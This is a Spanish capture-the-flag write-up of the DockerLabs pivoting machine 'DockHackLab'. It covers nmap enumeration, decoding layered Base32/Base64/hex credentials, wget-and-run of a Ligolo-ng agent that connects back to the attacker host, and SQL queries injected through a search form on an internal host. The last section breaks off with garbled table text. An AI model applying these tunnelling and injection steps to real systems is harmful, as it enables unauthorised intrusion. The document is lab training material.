
# 📑 Writeup: Máquina DockHackLab 🚀

<img width="426" height="463" alt="image" src="https://github.com/user-attachments/assets/ffb551bf-d13f-4fc5-a273-65a3667984e9" />

![OS: Linux](https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge&logo=linux)
![Platform: DockerLabs](https://img.shields.io/badge/Plataforma-DockerLabs-blue?style=for-the-badge)
![Dificultad: hard](https://img.shields.io/badge/Dificultad-hard-%23FF0000?style=for-the-badge)

#  Escaneo de  servicios  y puertos y serviicios 

`- NOTA` : `Esto no es un laboratorio de vulnerar y encontrar una vulnerabilidad especifica, segun el creador de la maquina (PatxaSec) es una maquina que simula el funcionamiento movimiento laterar (Pivoting) `


# Enumeracion de puertos y servicios 
```ruby
 nmap -sV -Pn -sC --min-rate 5000 -O --top-port 50000 10.10.10.2  
Starting Nmap 7.99 ( https://nmap.org ) 
Nmap scan report for 10.10.10.2
Host is up (0.00019s latency).
Not shown: 8384 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 7e:85:1a:70:b5:2e:c6:35:73:9b:64:77:ba:5f:72:8b (ECDSA)
|_  256 0a:67:56:22:1e:a1:aa:05:44:f0:b9:05:75:6d:9c:36 (ED25519)
80/tcp   open  http       Werkzeug httpd 3.0.4 (Python 3.12.3)
|_http-server-header: Werkzeug/3.0.4 Python/3.12.3
|_http-title: Not A CTF
2222/tcp open  tcpwrapped
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
MAC Address: 16:1E:63:32:B5:15 (Unknown)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 1 hop
```

# 🛡️ Reporte de Escaneo Nmap - 10.10.10.2

### 📊 Información del Objetivo
| Categoría | Detalle |
| :--- | :--- |
| **Sistema Operativo** | Linux 4.15 - 5.19 |
| **Distancia de Red** | 1 salto (hop) |
| **Título del Sitio Web** | `Not A CTF` |

---

### ⚙️ Configuración del Comando
| Parámetro | Definición y Uso |
| :--- | :--- |
| **`-sV`** | **Detección de versiones:** Identifica el software y la versión de los servicios. |
| **`-Pn`** | **Omitir Ping:** No verifica si el host responde a ICMP, asume que está activo. |
| **`-sC`** | **Scripts NSE:** Ejecuta los scripts de enumeración y seguridad por defecto. |
| **`--min-rate 5000`** | **Velocidad:** Mantiene una tasa mínima de 5000 paquetes por segundo. |
| **`-O`** | **Huella de S.O.:** Intenta identificar el sistema operativo mediante el stack TCP/IP. |
| **`--top-ports 50000`** | **Alcance:** Escanea los 50,000 puertos más comunes del ranking de Nmap. |

---

### 🔍 Servicios Detectados
| Puerto | Estado | Servicio | Versión |
| :--- | :--- | :--- | :--- |
| `22/tcp` | ✅ Abierto | SSH | OpenSSH 9.6p1 Ubuntu |
| `80/tcp` | ✅ Abierto | HTTP | Werkzeug httpd 3.0.4 (Python 3.12.3) |
| `2222/tcp` | ✅ Abierto | EtherNet/IP-1 | tcpwrapped |

# Puerto 80

arkdown
## 🌐 Análisis del Servicio Web (Puerto 80)

Al inspeccionar el puerto 80, confirmamos mediante el escaneo de Nmap que el servidor corre bajo **Python**. La interfaz presenta un diseño minimalista con un mensaje de advertencia.

### 🖼️ Interfaz de Usuario (Front-end)
La página muestra un banner informativo con el texto: *"¡Atención, esto no es un CTF!"*. Aunque el sitio menciona el uso de **Ligolo**, la arquitectura de la red nos obligará a utilizar herramientas de pivoting alternativas como **Chisel** y **Socat**.

| Elemento | Observación |
| :--- | :--- |
| **Tecnología** | Python (Werkzeug) |
| **Interactividad** | Botón de cierre de banner informativo |
| **Propósito** | Práctica de Pivoting y post-explotación |

---

## 🕵️ Encontrando el Vector de Acceso (Código Fuente)

Como el front-end no ofrece vectores de ataque directos (formularios, subida de archivos, etc.), procedemos a inspeccionar el **Código Fuente (Ctrl+U)**. En el footer del documento, localizamos información sensible ofuscada:

> **Hallazgo:** Se identifica un string codificado que sospechamos contiene las credenciales de acceso para el servicio SSH.

### 🛠️ Análisis del Pipeline de Decodificación

El comando utiliza una técnica de "capas" para extraer la credencial en claro. A continuación se explica la función de cada transformación:

| Herramienta | Función Técnica | Razón de uso en este reto |
| :--- | :--- | :--- |
| **`base32 -d`** | Decodifica un flujo de datos en Base32 (alfabeto A-Z, 2-7). | El string original usa caracteres permitidos por Base32 y tiene un padding de `====`. Es la primera capa de ofuscación. |
| **`base64 -d`** | Decodifica el resultado anterior usando el estándar Base64. | Tras el primer paso, los datos resultantes seguían codificados. Base64 permite comprimir datos binarios en texto legible. |
| **`xxd -r -p`** | **Reverse Hex Dump:** Convierte una cadena hexadecimal a su representación en ASCII/String. | La salida de Base64 devolvió valores en HEX (ej. `503073...`). `xxd` "limpia" esos bytes para que podamos leer la contraseña final. |

---

### 🔄 Flujo de Transformación de Datos

1. **Entrada:** Cadena larga con padding `====` (Típico de codificaciones de bloques).
2. **Paso 1 (Base32):** El resultado es un string intermedio todavía codificado.
3. **Paso 2 (Base64):** El resultado es una cadena de caracteres hexadecimales.
4. **Paso 3 (XXD):** Traducción de los pares hexadecimales a caracteres legibles.

**Resultado Final:** `P0seidón2022!`

### 🖥️ Configuración del Servidor (Proxy) en Máquina Atacante

Antes de conectar el agente, debemos preparar nuestro entorno local para recibir la conexión y gestionar el tráfico tunelizado.

| Componente | Acción / Comando | Descripción Técnica |
| :--- | :--- | :--- |
| **Directorio** | `cd /path/to/ligolo/` | Ubicación del binario del Proxy. |
| **Ejecución** | `./proxy -selfcert` | Inicia el servidor usando un certificado auto-firmado para cifrar el túnel. |
| **Puerto Local** | `11601` (Default) | Puerto que quedará a la escucha (Listening) para la conexión del agente. |

```ruby
INFO[0000] Loading configuration file ligolo-ng.yaml    
WARN[0000] daemon configuration file not found. Creating a new one... 
? Enable Ligolo-ng WebUI? Yes
? Allow CORS Access from https://webui.ligolo.ng? Yes
WARN[0002] WebUI enabled, default username and login are ligolo:password - make sure to update ligolo-ng.yaml to change credentials! 
WARN[0002] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
ERRO[0002] Certificate cache error: acme/autocert: certificate cache miss, returning a new certificate 
INFO[0002] Listening on 0.0.0.0:11601                   
INFO[0002] Starting Ligolo-ng Web, API URL is set to: http://127.0.0.1:8080 
WARN[0002] Ligolo-ng API is experimental, and should be running behind a reverse-proxy if publicly exposed. 
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _                                                                                                                                                                                           
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/                                                                                                                                                                                           
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ /                                                                                                                                                                                            
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /                                                                                                                                                                                             
        /____/                          /____/                                                                                                                                                                                              
                                                                                                                                                                                                                                            
  Made in France ♥            by @Nicocha30!                                                                                                                                                                                                
  Version: 0.8.3                                                                     
```
---

### 🛠️ Configuración de la Interfaz de Red (Networking)

Para que nuestro sistema operativo sepa cómo enviar paquetes a la red interna de Poseidón, configuramos una interfaz **TUN**:

| Paso | Comando | Propósito |
| :--- | :--- | :--- |
| **1. Crear TUN** | `sudo ip link add dev ligolo type tun` | Crea la interfaz virtual llamada `ligolo`. |
| **2. Levantar** | `sudo ip link set ligolo up` | Activa la interfaz para que pueda transmitir datos. |
| **3. Enrutar** | `sudo ip route add 20.20.20.0/24 dev ligolo` | Envía todo el tráfico destinado a la red `20.20.20.x` a través del túnel. |

---

### 🔗 Sincronización Agente-Proxy

Una vez que el agente se conecta desde Hades, la consola del Proxy mostrará un aviso de conexión. Debes seguir este flujo para activar el túnel:

1. **Seleccionar Sesión:** Escribe `session` y elige el número de ID correspondiente a la conexión de Hades.
2. **Iniciar Túnel:** Escribe `start` para comenzar el intercambio de paquetes cuando ya tengas el agente conectado a ligolo .



> **Tip** Verifica siempre con `ip route` que la ruta hacia la red `20.20.20.0/24` apunta correctamente a la interfaz `ligolo`. Si no lo haces, intentarás salir por tu puerta de enlace predeterminada (tu router) y no llegarás a Poseidón.

### 📂 Transferencia y Ejecución del Agente (Hades)

Para que **Hades** actúe como nuestro puente, debemos transferir el binario del agente y ejecutarlo apuntando a nuestra IP de atacante.

#### 1. Preparación en la Máquina Atacante
Primero, organizamos el binario y levantamos un servidor web temporal para la transferencia:

| Paso | Acción | Comando |
| :--- | :--- | :--- |
| **Directorio** | Crear carpeta de trabajo | `mkdir ligolo && cd ligolo` |
| **Servidor** | Levantar server Python | `python3 -m http.server 80` |

---

#### 2. Descarga y Despliegue en Hades
Desde la sesión de SSH en **Hades**, procedemos a descargar el agente y darle los privilegios necesarios para su ejecución:

| Acción | Comando | Descripción |
| :--- | :--- | :--- |
| **Descarga** | `wget http://10.0.2.15/agent_linux_amd64 -O agent` | Descarga el binario desde nuestra IP. |
| **Permisos** | `chmod +x agent` | Otorga permisos de ejecución al binario. |
| **Conexión** | `./agent -connect 10.0.2.15:11601 -ignore-cert` | Conecta el agente a nuestro Proxy local. |

---

### 🚀 Estableciendo la Comunicación

Al ejecutar el comando anterior, verás en tu terminal de **Hades** un mensaje indicando que la conexión ha sido exitosa. 



> **Nota Crítica:** El flag `-ignore-cert` es fundamental ya que estamos usando un certificado auto-firmado (`-selfcert`) en el proxy. Sin esto, la conexión sería rechazada por motivos de seguridad.

#### Estado del Túnel:
1. **Proxy Atacante:** Recibe la conexión y crea la sesión.
2. **Agente Hades:** Mantiene el túnel abierto y redirige el tráfico.
3. **Resultado:** Ahora podemos gestionar la red interna desde la consola del proxy escribiendo `session`.


# 🌊 Máquina Poseidón (20.20.20.3)

Tras activar el túnel con **Ligolo-ng** y añadir la ruta en nuestra máquina atacante (`sudo ip route add 20.20.20.0/24 dev ligolo`), ya tenemos conectividad nativa con la red interna.

## 🔍 Enumeración de Puertos

Gracias a la interfaz `tun`, podemos lanzar `nmap` directamente sin necesidad de `proxychains` o configuraciones adicionales.

### Ejecución del Escaneo
```ruby
nmap -sT -sCV -n -Pn 20.20.20.3

Starting Nmap 7.99 ( https://nmap.org ) 
Nmap scan report for 20.20.20.3
Host is up (0.040s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 41:ea:e9:70:88:38:11:2b:1f:36:3a:cb:bd:1a:bb:e2 (RSA)
|   256 2c:d8:bf:01:05:7e:7a:70:38:7c:7b:f2:ba:54:4b:20 (ECDSA)
|_  256 20:37:e5:92:15:dc:69:18:dc:09:bb:69:74:6d:ae:c5 (ED25519)
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-title: Dojos El Papapasito del mar
|_http-server-header: Apache/2.4.54 (Debian)S
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.01 seconds
                                                                 
```
# 🌊 Máquina Poseidón (20.20.20.3)

Tras activar el túnel con **Ligolo-ng** y añadir la ruta en nuestra máquina atacante (`sudo ip route add 20.20.20.0/24 dev ligolo`), ya tenemos conectividad nativa con la red interna.

## 🔍 Enumeración de Puertos

Gracias a la interfaz virtual, podemos lanzar `nmap` directamente sin necesidad de configuraciones adicionales.

| Puerto | Estado | Servicio | Versión / Detalles |
| :--- | :--- | :--- | :--- |
| **22/tcp** | open | ssh | OpenSSH 8.4p1 Debian 5+deb11u3 |
| **80/tcp** | open | http | Apache httpd 2.4.54 (Debian) |

**Análisis del Servicio HTTP:**
* **Título:** `Dojos El Papapasito del mar`
* **Servidor:** `Apache/2.4.54 (Debian)`
* **Sistema Operativo:** Linux (Debian)

---

## 🌐 Acceso Directo a la Web

A diferencia de otros métodos de pivoting, **Ligolo-ng** nos permite acceder a los servicios web de forma transparente abriendo directamente `http://20.20.20.3` en el navegador.

<img width="1910" height="993" alt="image" src="https://github.com/user-attachments/assets/2ff132a4-f65e-4af5-9723-2fff8c600c37" />

### Análisis del Front-end
En la barra de navegación vemos tres apartados: **Buscar, Ranking y Perfil**. A nosotros nos interesa "Buscar", ya que nos lleva a un subdirectorio con un sistema de búsqueda.

<img width="1912" height="993" alt="image" src="https://github.com/user-attachments/assets/9e15e60b-fec5-46f3-8c6e-3154bbf1b7ae" />

---

## 🕵️ Explotación de la Base de Datos

Revisamos el código fuente para ver cómo tramita la petición este sistema de búsqueda.

<img width="652" height="366" alt="image" src="https://github.com/user-attachments/assets/3374b8e3-f9c8-406e-95bd-74d5e20bdc6f" />

Podemos observar cómo tramita mediante el método **POST** una petición a un archivo `database.php`. Entendemos que pasa el parámetro del campo de búsqueda y realiza la consulta a la base de datos con él.

Tras varios intentos, confirmamos que se emplea **SQLite**, ya que estas bases de datos usan una tabla interna llamada `sqlite_master`. Introducimos en el campo de búsqueda la consulta: `select name from sqlite_master`.

<img width="1011" height="344" alt="image" src="https://github.com/user-attachments/assets/8fe65f05-6aca-4f85-9c76-e736f6033c31" />

Vemos dos tablas interesantes: **"usuarios"** y **"contrasena"**.

---

## 🔓 Decodificación de Credenciales

Extraemos los datos de los usuarios `poseidon` y `megalodon`. Las contraseñas parecen codificadas:

* `$sha1$hahahaha$JZKFCZ2ONJKWOTTNKFTU46SBM5HG2TLHJV5ECZ2NPJEWOTL2IFTU26SFM5GXU23HJVVEKPI=`

Usando el mismo procedimiento que en la máquina Hades (Base32 -> Base64 -> Hex), decodificamos el string:

```bash
echo 'JZKFCZ2ONJKWOTTNKFTU46SBM5HG2TLHJV5ECZ2NPJEWOTL2IFTU26SFM5GXU23HJVVEKPI=' | base32 -d | base64 -d | xxd -r -p
```
Resultado: Templ02019!
🔑 Acceso por SSH y EscaladaEntramos por SSH con el usuario megalodon hacia la IP 20.20.20.3. Una vez dentro, verificamos permisos de sudo.UsuarioIP Comando de 
```ruby
Escaladamegalodon20.20.20.3
```

<img width="908" height="624" alt="image" src="https://github.com/user-attachments/assets/86491aab-31cc-414f-8d21-1bf303083533" />

